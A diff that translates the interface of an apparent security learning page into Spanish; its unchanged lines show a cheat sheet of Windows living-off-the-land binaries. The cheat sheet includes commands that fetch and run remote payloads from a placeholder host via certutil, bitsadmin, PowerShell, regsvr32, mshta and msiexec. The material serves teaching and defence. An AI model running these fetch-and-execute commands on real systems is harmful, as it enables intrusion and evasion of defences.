@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html xmlns="http://www.w3.org/1999/xhtml" lang="../../es" xml:lang="../../es"><head>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="es-ES" xml:lang="es-ES"><head>
 
 <meta charset="utf-8">
 <meta name="generator" content="quarto-1.8.26">
@@ -90,17 +90,17 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
   ],
   "show-item-context": false,
   "language": {
-    "search-no-results-text": "No results",
-    "search-matching-documents-text": "matching documents",
-    "search-copy-link-title": "Copy link to search",
-    "search-hide-matches-text": "Hide additional matches",
-    "search-more-match-text": "more match in this document",
-    "search-more-matches-text": "more matches in this document",
-    "search-clear-button-title": "Clear",
+    "search-no-results-text": "No se han encontrado resultados",
+    "search-matching-documents-text": "documentos encontrados",
+    "search-copy-link-title": "Copiar el enlace en la búsqueda",
+    "search-hide-matches-text": "Ocultar resultados adicionales",
+    "search-more-match-text": "resultado adicional en este documento",
+    "search-more-matches-text": "resultados adicionales en este documento",
+    "search-clear-button-title": "Borrar",
     "search-text-placeholder": "",
-    "search-detached-cancel-button-title": "Cancel",
-    "search-submit-button-title": "Submit",
-    "search-label": "Search"
+    "search-detached-cancel-button-title": "Cancelar",
+    "search-submit-button-title": "Enviar",
+    "search-label": "Buscar"
   }
 }</script>
 
@@ -118,8 +118,8 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
     <span class="navbar-title">DevOps &amp; Security Learning Journey</span>
     </a>
   </div>
-            <div id="quarto-search" class="" title="Search"></div>
-          <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarCollapse" aria-controls="navbarCollapse" role="menu" aria-expanded="false" aria-label="Toggle navigation" onclick="if (window.quartoToggleHeadroom) { window.quartoToggleHeadroom(); }">
+            <div id="quarto-search" class="" title="Buscar"></div>
+          <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarCollapse" aria-controls="navbarCollapse" role="menu" aria-expanded="false" aria-label="Navegación de palanca" onclick="if (window.quartoToggleHeadroom) { window.quartoToggleHeadroom(); }">
   <span class="navbar-toggler-icon"></span>
 </button>
           <div class="collapse navbar-collapse" id="navbarCollapse">
@@ -187,7 +187,7 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
 <!-- margin-sidebar -->
     <div id="quarto-margin-sidebar" class="sidebar margin-sidebar">
         <nav id="TOC" role="doc-toc" class="toc-active">
-    <h2 id="toc-title">On this page</h2>
+    <h2 id="toc-title">En esta página</h2>
    
   <ul>
   <li><a href="#lolbins---living-off-the-land-binaries" id="toc-lolbins---living-off-the-land-binaries" class="nav-link active" data-scroll-target="#lolbins---living-off-the-land-binaries">LOLBins - Living Off The Land Binaries</a>
@@ -261,7 +261,7 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
 <span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a>certutil <span class="at">-urlcache</span> <span class="at">-split</span> <span class="at">-f</span> http:/<span class="at">/192</span>.168.1.100<span class="at">/payload</span>.exe</span>
 <span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a><span class="co">:: Descargar a directorio específico</span></span>
-<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a>certutil <span class="at">-urlcache</span> <span class="at">-split</span> <span class="at">-f</span> http:/<span class="at">/192</span>.168.1.100<span class="at">/file</span>.txt C:\Temp\file.txt</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a>certutil <span class="at">-urlcache</span> <span class="at">-split</span> <span class="at">-f</span> http:/<span class="at">/192</span>.168.1.100<span class="at">/file</span>.txt C:\Temp\file.txt</span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
 <section id="codificardecodificar-base64" class="level3">
 <h3 class="anchored" data-anchor-id="codificardecodificar-base64">Codificar/Decodificar Base64</h3>
@@ -272,12 +272,12 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
 <span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a>certutil <span class="at">-decode</span> encoded.txt decoded.txt</span>
 <span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a><span class="co">:: Decodificar desde URL</span></span>
-<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a>certutil <span class="at">-urlcache</span> <span class="at">-split</span> <span class="at">-f</span> http:/<span class="at">/192</span>.168.1.100<span class="at">/encoded</span>.txt encoded.txt <span class="kw">&amp;&amp;</span> certutil <span class="at">-decode</span> encoded.txt decoded.txt</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a>certutil <span class="at">-urlcache</span> <span class="at">-split</span> <span class="at">-f</span> http:/<span class="at">/192</span>.168.1.100<span class="at">/encoded</span>.txt encoded.txt <span class="kw">&amp;&amp;</span> certutil <span class="at">-decode</span> encoded.txt decoded.txt</span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
 <section id="limpiar-caché" class="level3">
 <h3 class="anchored" data-anchor-id="limpiar-caché">Limpiar caché</h3>
 <div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb3"><pre class="sourceCode cmd code-with-copy"><code class="sourceCode dosbat"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="co">:: Eliminar caché de certutil</span></span>
-<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a>certutil <span class="at">-urlcache</span> <span class="at">-split</span> <span class="at">-f</span> http:/<span class="at">/192</span>.168.1.100<span class="at">/file</span>.txt delete</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a>certutil <span class="at">-urlcache</span> <span class="at">-split</span> <span class="at">-f</span> http:/<span class="at">/192</span>.168.1.100<span class="at">/file</span>.txt delete</span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
 </section>
 <section id="bitsadmin" class="level2">
@@ -297,12 +297,12 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
 <span id="cb4-11"><a href="#cb4-11" aria-hidden="true" tabindex="-1"></a>bitsadmin <span class="at">/info</span> download_job</span>
 <span id="cb4-12"><a href="#cb4-12" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb4-13"><a href="#cb4-13" aria-hidden="true" tabindex="-1"></a><span class="co">:: Completar </span><span class="er">(</span><span class="co">mover a destino final</span><span class="er">)</span></span>
-<span id="cb4-14"><a href="#cb4-14" aria-hidden="true" tabindex="-1"></a>bitsadmin <span class="at">/complete</span> download_job</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<span id="cb4-14"><a href="#cb4-14" aria-hidden="true" tabindex="-1"></a>bitsadmin <span class="at">/complete</span> download_job</span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
 <section id="descarga-directa" class="level3">
 <h3 class="anchored" data-anchor-id="descarga-directa">Descarga directa</h3>
 <div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb5"><pre class="sourceCode cmd code-with-copy"><code class="sourceCode dosbat"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="co">:: Descarga directa </span><span class="er">(</span><span class="co">Windows 8+</span><span class="er">)</span></span>
-<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a>bitsadmin <span class="at">/transfer</span> download_job <span class="at">/download</span> <span class="at">/priority</span> normal http:/<span class="at">/192</span>.168.1.100<span class="at">/file</span>.txt C:\Temp\file.txt</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a>bitsadmin <span class="at">/transfer</span> download_job <span class="at">/download</span> <span class="at">/priority</span> normal http:/<span class="at">/192</span>.168.1.100<span class="at">/file</span>.txt C:\Temp\file.txt</span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
 </section>
 <section id="powershell" class="level2">
@@ -316,7 +316,7 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
 <span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a><span class="fu">iwr</span> <span class="op">-</span>uri http<span class="op">://</span><span class="dv">192.168</span><span class="op">.</span><span class="dv">1.100</span><span class="op">/</span>file<span class="op">.</span><span class="fu">txt</span> <span class="op">-</span>o file<span class="op">.</span><span class="fu">txt</span></span>
 <span id="cb6-6"><a href="#cb6-6" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb6-7"><a href="#cb6-7" aria-hidden="true" tabindex="-1"></a><span class="co"># Con credenciales</span></span>
-<span id="cb6-8"><a href="#cb6-8" aria-hidden="true" tabindex="-1"></a><span class="fu">Invoke-WebRequest</span> <span class="op">-</span>Uri <span class="st">'http://192.168.1.100/file.txt'</span> <span class="op">-</span>OutFile <span class="st">'file.txt'</span> <span class="op">-</span>Credential <span class="va">$cred</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<span id="cb6-8"><a href="#cb6-8" aria-hidden="true" tabindex="-1"></a><span class="fu">Invoke-WebRequest</span> <span class="op">-</span>Uri <span class="st">'http://192.168.1.100/file.txt'</span> <span class="op">-</span>OutFile <span class="st">'file.txt'</span> <span class="op">-</span>Credential <span class="va">$cred</span></span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
 <section id="webclient" class="level3">
 <h3 class="anchored" data-anchor-id="webclient">WebClient</h3>
@@ -329,7 +329,7 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
 <span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a><span class="co"># Con proxy</span></span>
 <span id="cb7-8"><a href="#cb7-8" aria-hidden="true" tabindex="-1"></a><span class="va">$wc</span> <span class="op">=</span> <span class="fu">New-Object</span> Net<span class="op">.</span><span class="fu">WebClient</span></span>
 <span id="cb7-9"><a href="#cb7-9" aria-hidden="true" tabindex="-1"></a><span class="va">$wc</span><span class="op">.</span><span class="fu">Proxy</span> <span class="op">=</span> <span class="op">[</span>Net<span class="op">.</span><span class="fu">WebRequest</span><span class="op">]::</span>GetSystemWebProxy<span class="op">()</span></span>
-<span id="cb7-10"><a href="#cb7-10" aria-hidden="true" tabindex="-1"></a><span class="va">$wc</span><span class="op">.</span><span class="fu">DownloadFile</span><span class="op">(</span><span class="st">'http://192.168.1.100/file.txt'</span><span class="op">,</span> <span class="st">'file.txt'</span><span class="op">)</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<span id="cb7-10"><a href="#cb7-10" aria-hidden="true" tabindex="-1"></a><span class="va">$wc</span><span class="op">.</span><span class="fu">DownloadFile</span><span class="op">(</span><span class="st">'http://192.168.1.100/file.txt'</span><span class="op">,</span> <span class="st">'file.txt'</span><span class="op">)</span></span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
 <section id="start-bitstransfer" class="level3">
 <h3 class="anchored" data-anchor-id="start-bitstransfer">Start-BitsTransfer</h3>
@@ -337,7 +337,7 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
 <span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a><span class="fu">Start-BitsTransfer</span> <span class="op">-</span>Source <span class="st">'http://192.168.1.100/file.txt'</span> <span class="op">-</span>Destination <span class="st">'file.txt'</span></span>
 <span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Descarga asíncrona</span></span>
-<span id="cb8-5"><a href="#cb8-5" aria-hidden="true" tabindex="-1"></a><span class="fu">Start-BitsTransfer</span> <span class="op">-</span>Source <span class="st">'http://192.168.1.100/file.txt'</span> <span class="op">-</span>Destination <span class="st">'file.txt'</span> <span class="op">-</span>Asynchronous</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<span id="cb8-5"><a href="#cb8-5" aria-hidden="true" tabindex="-1"></a><span class="fu">Start-BitsTransfer</span> <span class="op">-</span>Source <span class="st">'http://192.168.1.100/file.txt'</span> <span class="op">-</span>Destination <span class="st">'file.txt'</span> <span class="op">-</span>Asynchronous</span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
 </section>
 <section id="regsvr32" class="level2">
@@ -345,7 +345,7 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
 <section id="ejecutar-script-remoto" class="level3">
 <h3 class="anchored" data-anchor-id="ejecutar-script-remoto">Ejecutar script remoto</h3>
 <div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb9"><pre class="sourceCode cmd code-with-copy"><code class="sourceCode dosbat"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="co">:: Ejecutar script SCT desde URL</span></span>
-<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a>regsvr32 <span class="at">/s</span> <span class="at">/n</span> <span class="at">/u</span> <span class="at">/i:</span>http:/<span class="at">/192</span>.168.1.100<span class="at">/script</span>.sct scrobj.dll</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a>regsvr32 <span class="at">/s</span> <span class="at">/n</span> <span class="at">/u</span> <span class="at">/i:</span>http:/<span class="at">/192</span>.168.1.100<span class="at">/script</span>.sct scrobj.dll</span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
 <section id="script-sct-de-ejemplo" class="level3">
 <h3 class="anchored" data-anchor-id="script-sct-de-ejemplo">Script SCT de ejemplo</h3>
@@ -356,14 +356,14 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
 <span id="cb10-5"><a href="#cb10-5" aria-hidden="true" tabindex="-1"></a>    var r = new ActiveXObject("WScript.Shell").Run("cmd /c echo LOLBin executed");</span>
 <span id="cb10-6"><a href="#cb10-6" aria-hidden="true" tabindex="-1"></a>&lt;/<span class="kw">script</span>&gt;</span>
 <span id="cb10-7"><a href="#cb10-7" aria-hidden="true" tabindex="-1"></a>&lt;/<span class="kw">registration</span>&gt;</span>
-<span id="cb10-8"><a href="#cb10-8" aria-hidden="true" tabindex="-1"></a>&lt;/<span class="kw">scriptlet</span>&gt;</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<span id="cb10-8"><a href="#cb10-8" aria-hidden="true" tabindex="-1"></a>&lt;/<span class="kw">scriptlet</span>&gt;</span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
 </section>
 <section id="mshta" class="level2">
 <h2 class="anchored" data-anchor-id="mshta">mshta</h2>
 <section id="ejecutar-hta-remoto" class="level3">
 <h3 class="anchored" data-anchor-id="ejecutar-hta-remoto">Ejecutar HTA remoto</h3>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb11"><pre class="sourceCode cmd code-with-copy"><code class="sourceCode dosbat"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a>mshta http:/<span class="at">/192</span>.168.1.100<span class="at">/payload</span>.hta</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb11"><pre class="sourceCode cmd code-with-copy"><code class="sourceCode dosbat"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a>mshta http:/<span class="at">/192</span>.168.1.100<span class="at">/payload</span>.hta</span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
 <section id="hta-de-ejemplo" class="level3">
 <h3 class="anchored" data-anchor-id="hta-de-ejemplo">HTA de ejemplo</h3>
@@ -377,7 +377,7 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
 <span id="cb12-8"><a href="#cb12-8" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">head</span><span class="dt">&gt;</span></span>
 <span id="cb12-9"><a href="#cb12-9" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">body</span><span class="dt">&gt;</span></span>
 <span id="cb12-10"><a href="#cb12-10" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">body</span><span class="dt">&gt;</span></span>
-<span id="cb12-11"><a href="#cb12-11" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">html</span><span class="dt">&gt;</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<span id="cb12-11"><a href="#cb12-11" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">html</span><span class="dt">&gt;</span></span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
 </section>
 <section id="msiexec" class="level2">
@@ -388,7 +388,7 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
 <span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a>msiexec <span class="at">/q</span> <span class="at">/i</span> http:/<span class="at">/192</span>.168.1.100<span class="at">/installer</span>.msi</span>
 <span id="cb13-3"><a href="#cb13-3" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb13-4"><a href="#cb13-4" aria-hidden="true" tabindex="-1"></a><span class="co">:: Con parámetros</span></span>
-<span id="cb13-5"><a href="#cb13-5" aria-hidden="true" tabindex="-1"></a>msiexec <span class="at">/q</span> <span class="at">/i</span> http:/<span class="at">/192</span>.168.1.100<span class="at">/installer</span>.msi PARAMETER=<span class="st">"value"</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<span id="cb13-5"><a href="#cb13-5" aria-hidden="true" tabindex="-1"></a>msiexec <span class="at">/q</span> <span class="at">/i</span> http:/<span class="at">/192</span>.168.1.100<span class="at">/installer</span>.msi PARAMETER=<span class="st">"value"</span></span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
 </section>
 <section id="cscriptwscript" class="level2">
@@ -409,7 +409,7 @@ If objXMLHTTP.Status = 200 Then
     objADOStream.SaveToFile "file.txt"
     objADOStream.Close
 End If</code></pre>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb15"><pre class="sourceCode cmd code-with-copy"><code class="sourceCode dosbat"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a>cscript download.vbs</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb15"><pre class="sourceCode cmd code-with-copy"><code class="sourceCode dosbat"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a>cscript download.vbs</span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
 </section>
 <section id="explorer.exe" class="level2">
@@ -420,7 +420,7 @@ End If</code></pre>
 <span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a>explorer http:/<span class="at">/192</span>.168.1.100<span class="at">/file</span>.txt</span>
 <span id="cb16-3"><a href="#cb16-3" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb16-4"><a href="#cb16-4" aria-hidden="true" tabindex="-1"></a><span class="co">:: Conecta a WebDAV</span></span>
-<span id="cb16-5"><a href="#cb16-5" aria-hidden="true" tabindex="-1"></a>explorer \\192.168.1.100@80\DavWWWRoot</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<span id="cb16-5"><a href="#cb16-5" aria-hidden="true" tabindex="-1"></a>explorer \\192.168.1.100@80\DavWWWRoot</span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
 </section>
 <section id="makecab" class="level2">
@@ -431,13 +431,13 @@ End If</code></pre>
 <span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a>makecab file.txt file.cab</span>
 <span id="cb17-3"><a href="#cb17-3" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb17-4"><a href="#cb17-4" aria-hidden="true" tabindex="-1"></a><span class="co">:: Expandir archivo</span></span>
-<span id="cb17-5"><a href="#cb17-5" aria-hidden="true" tabindex="-1"></a>expand file.cab C:\Temp\file.txt</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<span id="cb17-5"><a href="#cb17-5" aria-hidden="true" tabindex="-1"></a>expand file.cab C:\Temp\file.txt</span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
 </section>
 <section id="extrac32" class="level2">
 <h2 class="anchored" data-anchor-id="extrac32">extrac32</h2>
 <div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb18"><pre class="sourceCode cmd code-with-copy"><code class="sourceCode dosbat"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a><span class="co">:: Extraer archivo</span></span>
-<span id="cb18-2"><a href="#cb18-2" aria-hidden="true" tabindex="-1"></a>extrac32 <span class="at">/C</span> file.cab C:\Temp\file.txt</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<span id="cb18-2"><a href="#cb18-2" aria-hidden="true" tabindex="-1"></a>extrac32 <span class="at">/C</span> file.cab C:\Temp\file.txt</span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
 <section id="resumen" class="level2">
 <h2 class="anchored" data-anchor-id="resumen">Resumen</h2>
@@ -523,12 +523,12 @@ End If</code></pre>
       // flash "checked"
       button.classList.add('code-copy-button-checked');
       var currentTitle = button.getAttribute("title");
-      button.setAttribute("title", "Copied!");
+      button.setAttribute("title", "Copiado");
       let tooltip;
       if (window.bootstrap) {
         button.setAttribute("data-bs-toggle", "tooltip");
         button.setAttribute("data-bs-placement", "left");
-        button.setAttribute("data-bs-title", "Copied!");
+        button.setAttribute("data-bs-title", "Copiado");
         tooltip = new bootstrap.Tooltip(button, 
           { trigger: "manual", 
             customClass: "code-copy-button-tooltip",
